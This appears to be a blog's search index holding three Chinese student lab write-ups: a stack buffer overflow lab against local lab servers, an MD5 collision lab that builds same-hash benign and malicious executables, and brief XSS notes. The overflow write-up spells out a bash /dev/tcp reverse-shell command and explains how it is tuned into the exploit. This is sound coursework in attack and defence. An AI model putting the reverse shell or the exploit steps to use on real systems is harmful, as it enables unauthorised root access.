<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>栈溢出</title>
      <link href="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>缓冲区溢出</p><p>本实验的学习目标是让学生将从课堂上学到的有关缓冲区溢出漏洞的知识进行实践，从而获得有关该漏洞的第一手经验。缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。</p><p>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><h1 id="一、-实验环境准备："><a href="#一、-实验环境准备：" class="headerlink" title="一、   实验环境准备："></a>一、   实验环境准备：</h1><ol><li>在开始这个实验之前，我们需要确保关闭地址随机化对策，否则，攻击将很困难。可以使用以下命令执行此操作，以后便于不断调试：   <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121043134.png" alt="image-20231011121043134"></li></ol><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121106389.png" alt="image-20231011121106389"></p><ol start="2"><li>阅读server.c明白实验环境原理：</li></ol><p>关键代码解释：</p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121117177.png" alt="image-20231011121117177"> </p><p>上述代码表示在建立了链接以后，创建了一个子进程，子进程使用 dup2 将标准输入重定向到与客户端通信的套接字。也就是说，标准输入内容由远程用户决定，这也是我们可以利用的地方。</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121124037.png" alt="image-20231011121124037"></p><p>上述代码表示：通过 execle 执行程序 “stack”，并传递随机生成的环境变量数组。</p><p>总体功能：此程序创建了一个基于TCP的服务器，监听指定端口（9090），用于接受连接并在子进程中执行名为 “stack” 的程序，这个服务器还试图在生成子进程时随机生成一些环境变量，以增加栈的随机性。</p><ol start="3"><li>阅读并理解stack.c程序：</li></ol><p>这个实验室中使用的易受攻击的程序名为 stack.c，位于服务器代码文件夹中。这个程序有一个缓冲区溢出漏洞，我们的目的式利用这个漏洞并获得根特权。以下是部分stack.c代码：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121147825.png" alt="image-20231011121147825"></p><p>代码解释：上述程序有缓冲区溢出漏洞。它从标准输入中读取数据，然后将数据传递给函数 bof ()中的另一个缓冲区。原始输入的最大长度可以是517字节，但是 bof ()中的缓冲区只有 BUF SIZE 字节长，小于517。因为 strcpy ()不检查边界，所以会发生缓冲区溢出。因此可以在分配给buffer大小以外的部分构造攻击代码，溢出部分拥有当前用户权限来执行指令。</p><ol start="4"><li>编译</li></ol><p>编译stack.c文件，只不过还需要使用-fno-stack-protector 和 -z execstack来关闭堆栈保护器和不可执行的堆栈保护。（已写入makefile）</p><p>接下来make一下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121205120.png" alt="image-20231011121205120"></p><ol start="5"><li>创建容器，启动并检查：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121213119.png" alt="image-20231011121213119"></p><p>创建成功：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121218555.png" alt="image-20231011121218555"></p><p>启动容器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121224725.png" alt="image-20231011121224725"></p><p>现在四个服务均正常启动</p><p>关闭容器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121230224.png" alt="image-20231011121230224"></p><p>至此环境准备完成。</p><h1 id="二、-TASK1：熟悉ShellCode"><a href="#二、-TASK1：熟悉ShellCode" class="headerlink" title="二、   TASK1：熟悉ShellCode"></a>二、   TASK1：熟悉ShellCode</h1><ol><li>阅读通用的shellcode代码（32位为例）：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121243242.png" alt="image-20231011121243242"></p><p>根据实验手册解释，Shell 代码运行“&#x2F;bin&#x2F;bash”shell 程序 ，但它有两个参数“-c”和一个命令字符串(红框部分)。这表明 shell 程序将运行第二个参数中的命令。这些字符串末尾的 * 只是一个占位符，在执行 shell 代码期间，它将被一个0x00字节替换。</p><ol start="2"><li>实现删除功能：</li></ol><p>先新建一个测试删除的文件“test.txt”：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121254930.png" alt="image-20231011121254930"></p><p>修改shellcode的命令，其中要注意的是，由于 argv []数组的占位符的起始位置(就在命令字符串之后)是在 shell 代码的二进制部分中硬编码的，即已经被写死，所以*的位置要保持不变：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121315030.png" alt="image-20231011121315030"></p><ol start="3"><li>测试删除功能：</li></ol><p>根据readme的提示进行操作：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121324922.png" alt="image-20231011121324922"></p><h1 id="三、-Task-2-Level-1-Attack"><a href="#三、-Task-2-Level-1-Attack" class="headerlink" title="三、   Task 2: Level-1 Attack"></a>三、   Task 2: Level-1 Attack</h1><ol><li>环境准备，启动docker中的第一个server，ip端口为：10.9.0.5 9090：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121335941.png" alt="image-20231011121335941"></p><ol start="2"><li>良性消息测试：输入hello字符串查看正常输出，观察ebp的值：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121341808.png" alt="image-20231011121341808"></p><ol start="3"><li>构造攻击文件（32位）：</li></ol><p>Step1：先测试exploit.py生成的badfile在server中的情况如何：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121352447.png" alt="image-20231011121352447"></p><p>Setp2：画出函数调用的栈帧图：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121400111.png" alt="image-20231011121400111"></p><p>利用shellcode的最核心一点就是在执行完函数以后，esp+4（指向返回地址的下一个地址）是固定的指令，而它刚好可以让esp回到父函数栈顶；ret一执行，程序就会跳到esp所指位置，而实验所给的shellcode填充的是NOP指令，也就是会cpu什么也不做，一直跳转下一条指令，所以只要shellcode的返回地址足够高，就一定会被执行到。。</p><p>Step3：分析得出在exploit.py中需要修改的参数</p><p>​     Ret为shellcode的入口地址：ebp+8（或更高）</p><p>​     Offset为ret的偏移值：ebp-buffer+4</p><p>​     Start：517-len(shellcode)，把badfile中的后面部分替换为攻击代码</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121411812.png" alt="image-20231011121411812"></p><p>修改shellcode中的内容，模仿task1输入：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121420264.png" alt="image-20231011121420264"></p><p>Step4：在执行一次脚本文件，生成新的badfile，并输入给服务器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121426149.png" alt="image-20231011121426149"></p><p>\4. Reverse shell：</p><p>上述操作只能够执行shell中固定的指令，所以需要把shellcode改为 reverseshell，使得远程用户可以拿到目标主机的root权限：</p><p>Step1：修改bash为</p><p>“&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1      *”</p><p>&#x2F;bin&#x2F;bash -i: 启动一个交互式的 Bash shell。-i 选项表示交互式模式，即用户可以输入命令并获取输出。</p><p>&gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090：将标准输出重定向到攻击者主机的9090端口</p><p>0&lt;&amp;1：表示将用户的标准输入重定向到标准输出</p><p>2&gt;&amp;1：表示将用户的标准错误输出也重定向到标准输出</p><p>而标准输出有重定向到了tcp链接，也就是到了攻击者的主机端口上，这样只要服务端点击了我们上传的badfile他就会自己建立tcp连接，我们就拿到了root权限的shell：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121436878.png" alt="image-20231011121436878"></p><p>Step2：新开一个终端，作为攻击者 开放9090端口，一直监听，等待服务器连接：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121441370.png" alt="image-20231011121441370"></p><p>还可以测试一下是否拿到了权限，结果是肯定的：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121448578.png" alt="image-20231011121448578"></p><h1 id="四、-Task3：Level-2-Attack"><a href="#四、-Task3：Level-2-Attack" class="headerlink" title="四、   Task3：Level-2 Attack"></a>四、   Task3：Level-2 Attack</h1><ol><li>上传良性字符串到10.9.0.6中，查看打印信息：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121457578.png" alt="image-20231011121457578"></p><p>只能看到buffer的起始地址而无法得知ebp的值,也就无法定位ret的地址。</p><ol start="2"><li>根据题目要求，我们知道buffer的范围[100,300]，那么offset就应该在[104,304]之间，且最终的ret地址应该是4的倍数，由于整个shellcode的结构中：ret往高地址方向全部填充的式NOP指令，是无效的，会一直往下面跳转，所以保证返回地址&gt;&#x3D;buf_addr+308,就能够保证eip一定会指向NOP指令或shellcode指令入口处，即使跳转到了NOP所在地址，也一定会执行到shellcode，所以在整个范围中全部填充为ret。</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121508846.png" alt="image-20231011121508846"></p><ol start="3"><li>同样的方法创建反弹shell：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121527603.png" alt="image-20231011121527603"></p><h1 id="五、-Task-4-Level-3-Attack"><a href="#五、-Task-4-Level-3-Attack" class="headerlink" title="五、   Task 4: Level-3 Attack"></a>五、   Task 4: Level-3 Attack</h1><ol><li><p>这个任务中32位字变成了64位字，原理都一样，但是正如手册指出，难点在于虽然机器支持64位字，但是最大只能到：0x00007FFFFFFFFFFF，也就是会出现00 00，而scrapy遇到0就停止复制，所以我们需要把想办法解决这个问题。</p></li><li><p>先照常输入查看打印信息：</p></li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121541707.png" alt="image-20231011121541707"></p><ol start="3"><li>目前想到的解决办法是：在截断之前，就把shellcode全部拷贝进去，此时ret指向前面的shellcode地址，也就是可以改变start的值，不让他在末尾填充，而在一开始填充，ret就是buffer_addr+start。Exploit4.py如下：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121550601.png" alt="image-20231011121550601"></p><p>反弹shell实验如下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121602353.png" alt="image-20231011121602353"></p><h1 id="六、-Task-5-Level-4-Attack"><a href="#六、-Task-5-Level-4-Attack" class="headerlink" title="六、   Task 5: Level-4 Attack"></a>六、   Task 5: Level-4 Attack</h1><ol><li>本任务中，buffer的大小变小，打印：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121611023.png" alt="image-20231011121611023"></p><p>只相差了96字节，而上一问打印除了shellcode的长度为165字节，显然已经超过了。所以不适于将shellcode放进缓冲区，而放在ret段后面又会被截断，所以采取直接指向原数组中shellcode的地址，因此尽可能将ret设置大一点，跳转到数据段的shellcode代码部分执行shellcode，代码中打印了一下ret的类型以及十六进制值。</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121617494.png" alt="image-20231011121617494"></p><h1 id="七、-Task-6-Experimenting-with-the-Address-Randomization"><a href="#七、-Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="七、   Task 6: Experimenting with the Address Randomization"></a>七、   Task 6: Experimenting with the Address Randomization</h1><ol><li>关闭地址随机化：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121626703.png" alt="image-20231011121626703"></p><ol start="2"><li>向server1多次发送连接：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121633606.png" alt="image-20231011121633606"></p><ol start="3"><li>所以只能采取固定返回地址，不断尝试直到连接上目标主机为止，即可运行实验中提供的brute-force.sh：</li></ol><p>就使用原来的exploit.py来尝试：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121642500.png" alt="image-20231011121642500"></p><p>在此只尝试了3分钟就停止了，因为已经感受到了开启随机地址化后，必然将对于缓冲区域溢出攻击产生极大阻碍。</p><h1 id="八、-Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#八、-Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="八、   Tasks 7: Experimenting with Other Countermeasures"></a>八、   Tasks 7: Experimenting with Other Countermeasures</h1><ol><li>栈溢出保护</li></ol><p>根据实验手册，gcc提供了一种栈保护机制，在开启栈保护机制以后来观察现象：</p><p>首先关闭-fno-stack-protector：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121654532.png" alt="image-20231011121654532"></p><p>重新执行exploit.py生成badfile，将其复制到server-code中，在把badfile作为标准输入，：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121702274.png" alt="image-20231011121702274"></p><p>结果如下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121711740.png" alt="image-20231011121711740"></p><ol start="2"><li>栈不可执行</li></ol><p>编译call_shellcode.c时不使用-z execstack </p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121748889.png" alt="image-20231011121748889"></p><p>重新make，在再执行a32.out：</p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121745086.png" alt="image-20231011121745086"></p><p>出现段错误。这不能避免缓冲区溢出，只是禁止了shellcode的执行。</p><blockquote><p>这里的shellcode使用的是NOP雪橇，实现shellcode的方法还有很多，比如使用jmp esp指令等</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出，shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5碰撞</title>
      <link href="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/"/>
      <url>/2023/10/11/MD5%E7%A2%B0%E6%92%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>实验3：MD5碰撞试验</p><p>a) 使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；</p><p>b) 参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</p><p>c) 参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</p><p>d) 回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><h1 id="一、-使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况"><a href="#一、-使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况" class="headerlink" title="一、   使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况"></a>一、   使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况</h1><ol><li>创建一个text文本，利用md5collgen生成两个文件：</li></ol><p>命令为：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113844687.png" alt="image-20231011113844687">                              </p><p>文件内容为：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113851441.png" alt="image-20231011113851441"></p><ol start="2"><li>利用工具产生两个文件：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113913173.png" alt="image-20231011113913173"></p><ol start="3"><li>再查看out1.bin和out2.bin的md5码，发现二者值相同：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113920547.png" alt="image-20231011113920547"></p><ol start="4"><li>再利用bless十六进制编辑器查看二者的十六进制编码：</li></ol><p>命令为：</p><p>   <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113929606.png" alt="image-20231011113929606"></p><p>Out1.bin的：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113934815.png" alt="image-20231011113934815"></p><p>Out2.bin的：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113941637.png" alt="image-20231011113941637"></p><p>观察得出前缀相同(都是text.txt)，填充内容有不同之处(但是md5相同)</p><p>这与md5collgen的工作原理有关。具体来说，这个工具可以提供生成相同前缀的文件的功能，它从”text.txt”文件中提取前缀，并在必要时对前缀进行零填充，以确保其长度为64的倍数。然后，md5collgen用这些前缀生成两个输出文件，这两个文件的内容都包含在生成的128字节中，但它们之间存在部分差异。具体来说md5collgen通过相同前缀生成MD5相同的文件原理如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113949253.png" alt="image-20231011113949253"></p><ol start="5"><li>最后验证两个文件是否相同：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011113956726.png" alt="image-20231011113956726"></p><p>这证明了两个文件是不同的。</p><h1 id="二、-参考Lab3-task2-c的代码，生成两个MD5值相同但输出不同的两个可执行文件。"><a href="#二、-参考Lab3-task2-c的代码，生成两个MD5值相同但输出不同的两个可执行文件。" class="headerlink" title="二、   参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。"></a>二、   参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</h1><ol><li>先观察Lab3_task2.c源代码文件：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114003609.png" alt="image-20231011114003609"></p><p>其功能为：将某个字符串以16进制的形式进行打印，中间的数组需要自己填充。</p><ol start="2"><li><p>MD5原理解释：</p><p>  a)  MD5是一个相当复杂的算法，但从很高的层次来看，它并不复杂。MD5将输入数据分成64字节的块，然后在这些块上迭代计算散列。MD5算法的核心是一个压缩函数，它接受两个输入，一个64字节的数据块和前一次迭代的结果。压缩函数产生一个128位的 IHV，它代表“中间散列值”; 这个输出然后被反馈到下一次迭代中。如果当前迭代是最后一次迭代，则 IHV 将是最终的散列值。第一次迭代的 IHV 输入(IHV0)是一个固定值，具体原理如下图所示：</p></li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114025720.png" alt="image-20231011114025720"></p><p>​b)  MD5 碰撞具有添加后缀依然碰撞的性质: 若 hash(A)&#x3D;hash(B)，则 hash(A+S)&#x3D;hash(B+S) 但是并不满足增加前缀的性质，即 hash(A)&#x3D;hash(B)推不出 hash(S+A)&#x3D;hash(S+B)</p><ol start="3"><li>根据MD5的原理和弱抗碰撞性，可以找到一个构造思路：</li></ol><p>​a)  md5collgen可以构造出前缀相同且MD5相同的两个文件，且其后面填充的128个字节不同：</p><p>​        i.    MD5（perfix||P）&#x3D;MD5（perfix||Q）</p><p>​b)  MD5具有添加后缀依然碰撞的性质，所以可以构造两条消息,使得他们具有相同的前缀和后缀，即我们在数组当中需要去寻找到对应的前缀部分（64字节）中间的128字节，以及后缀，构造消息如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114050051.png" alt="image-20231011114050051"></p><p>​        i.    即：MD5（perfix||P||suffix）&#x3D;MD5（perfix||Q||suffix）</p><ol start="4"><li>具体实验步骤如下：</li></ol><p>​a)  首先在xyz数组中填上一些随机值，这里选择全部填为A（ASCLL码&#x3D;0x41），这样便于在bless中查找文件内容位置：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114114808.png" alt="image-20231011114114808"></p><p>​b)  Gcc编译运行文件</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114127917.png" alt="image-20231011114127917"></p><p>​c)  通过bless十六进制编辑器查看Lab3_task2定位字符串部分：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114135127.png" alt="image-20231011114135127"></p><p>​     再定位到A开头的字节偏移位置为：0x3020即第12320个字节</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114143590.png" alt="image-20231011114143590"></p><p>​d)  定位前后缀位置：</p><p>​        i.    由于开头是第12320个字节，寻找最近的64的倍数为：12352，所以确定了前缀分割点为第12352个字节；往后移128个字节，得到第二个分割点为：第12481个字节。</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114150718.png" alt="image-20231011114150718"></p><p>​e)  通过md5collgen利用先前的到的perfix生成两个MD相同的文件，再使用cat吧后缀suffix拼接到后面：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114156546.png" alt="image-20231011114156546"></p><p>​f)  对文件赋予执行权限后输出，验证二者的MD5码是否相同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114215801.png" alt="image-20231011114215801"></p><p>对比输出，文件不同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114223076.png" alt="image-20231011114223076"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114228155.png" alt="image-20231011114228155"></p><p>再查看文件的MD5码，发现相同：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114233791.png" alt="image-20231011114233791"></p><h1 id="三、-参考Lab3-task3-c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。"><a href="#三、-参考Lab3-task3-c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。" class="headerlink" title="三、  参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。"></a>三、  参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</h1><ol><li>观察task3的伪代码：</li></ol><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114243058.png" alt="image-20231011114243058"></p><p> 他要求我们实现的功能为：设定两个数组，若两个数组内容相同，则执行正常代码；否则，执行恶意代码，对应了题目要求的代码行为不同。</p><ol start="2"><li>构造思路：</li></ol><p>​a)  根据第二问的经验，我们仍然采取切片拼接的方式完成第三问，即将X与Y数组填充相同的值，再在bless中去找到对应的X、Y数组部分。通过切片构造两个可执行文件，其中一个执行后输出benign，另一组则输出malicious。</p><p>​b)  针对连个代码的构造方式如下图所示：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114258858.png" alt="image-20231011114258858"></p><p>上边一组表示X Y数组相同，执行benign；</p><p>下边一组表示X Y数组不同，执行malicious，P、Q表示由md5collgen生成的两个md5值相同的文件的不同部分。</p><ol start="3"><li>操作步骤：</li></ol><p>​a)  针对X、Y数组，首先填充相同的值，使他们一致，代码改动如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114338990.png" alt="image-20231011114338990"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114345729.png" alt="image-20231011114345729"></p><p>​b)  编译源代码，运行结果如下：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114351418.png" alt="image-20231011114351418"></p><p>可见，运行出来是正常代码。</p><p>​c)  利用bless查看数组的位置仍然是0x3020</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114404185.png" alt="image-20231011114404185"></p><p>​d)  确定切片的位置，前缀为第12352个字节，从gcc开始的那个字节（即第12745）开始往后作为suffix，通过head与tail命令进行处理：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114412923.png" alt="image-20231011114412923"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114416894.png" alt="image-20231011114416894"></p><p>​e)  通过md5collgen生成两个MD5相同的文件prefix1_task3、prefix2_task3：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114423269.png" alt="image-20231011114423269"></p><p>​f)  把prefix1_task3 中数组 X的后32个字节+128(md5填充物)&#x3D;160个字节截取出来作为 middle_task3，得到新数组Z：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114437810.png" alt="image-20231011114437810"></p><p>​g)  由于Z的长度为160，还差40个字节才满40，所以需要填充40个字节，这里利用python去构造这40个字节：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114442199.png" alt="image-20231011114442199"></p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114447282.png" alt="image-20231011114447282"></p><p>去除末尾的0A：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114453429.png" alt="image-20231011114453429"></p><p>​h)  最后发现XY之间差了24个字节，对间隔的部分构造：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114459549.png" alt="image-20231011114459549"></p><p>​i)  由此得到了所有构造的部分：</p><p>Benign： prefix1_task3 pure40 pure24 middle_task3  pure40  后缀：suffix_task3</p><p>Malicious:  prefix2_task3 pure40 pure24  middle_task3 pure40 后缀：suffix_task3</p><p>​j)  拼接两组代码并修改执行权限：</p><p> <img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114521644.png" alt="image-20231011114521644"></p><p>​k)  比较运行结果：</p><p>MD5值相同：</p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114545435.png" alt="image-20231011114545435"></p><p>​        运行结果：</p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114552554.png" alt="image-20231011114552554"></p><p><img src="/2023/10/11/MD5%E7%A2%B0%E6%92%9E/image-20231011114558443.png" alt="image-20231011114558443"></p><h1 id="四、-回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？"><a href="#四、-回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？" class="headerlink" title="四、   回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？"></a>四、   回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</h1><p>a) 相同的MD5值：截取第64位倍数的字节作为前缀，通过md5collgen就能够生产相同MD5的两个不同文件，文件不同的部分在前缀之后，利用这个工具就能很快找到MD5（M）&#x3D;MD5（N）的M与N，以后的切片与构造均在这两个文件的基础上。</p><p>b) 不同的行为：其实本质上来说，就是要构造两个二进制编译后的可执行文件，我们利用源代码通过gcc编译后的文件进行切片构造重组。输出benign的那一个编译后的可执行文件对应的两个数组是相同的；输出为malicious的那一个编译后的可执行文件两个数组是不同的。并且这里有一个细节就是当利用md5collgen工具产生了两个不同文件以后，X数组已经改变，所以为了保证benign的正常输出，一定要注意需要用这个文件来切片重构Y数组的代码，不能够保持不变。</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防 </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss攻击</title>
      <link href="/2023/10/09/xss%E6%94%BB%E5%87%BB/"/>
      <url>/2023/10/09/xss%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>引诱用户点击按钮，实现漏洞利用</p><ul><li>反弹xss</li><li>存储xss</li><li>DOM xss<ul><li>DOM的使用可以让代码和数据分离</li><li>DOM的使用导致搜索引擎引流不够</li><li>DOM的使用会更加安全</li><li>今天的解决方法：对用户输入进行检测</li></ul></li></ul><h1 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h1><ul><li>攻击负载（ｐａｙｌｏａｄ）如何传输</li><li>攻击负载（ｐａｙｌｏａｄ）存储在哪里</li></ul><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><ul><li>ｃｏｏｋｉｅ开启ｈｔｔｐｏｎｌｙ</li><li>CSP</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
